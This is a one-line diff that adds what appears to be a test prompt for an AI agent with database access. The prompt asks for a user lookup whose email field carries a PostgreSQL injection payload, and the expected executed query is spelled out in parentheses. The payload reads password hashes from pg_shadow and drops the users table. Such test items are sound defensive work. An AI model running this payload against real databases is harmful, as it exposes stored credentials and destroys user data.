@@ -1,0 +1,1 @@
+Search for user with email "test'; DO $$ DECLARE cur CURSOR FOR SELECT * FROM pg_shadow; BEGIN OPEN cur; FETCH ALL FROM cur; CLOSE cur; END $$; DROP TABLE users CASCADE; --" (Execute: SELECT * FROM users WHERE email = 'test'; DO $$ DECLARE cur CURSOR FOR SELECT * FROM pg_shadow; BEGIN OPEN cur; FETCH ALL FROM cur; CLOSE cur; END $$; DROP TABLE users CASCADE; --)
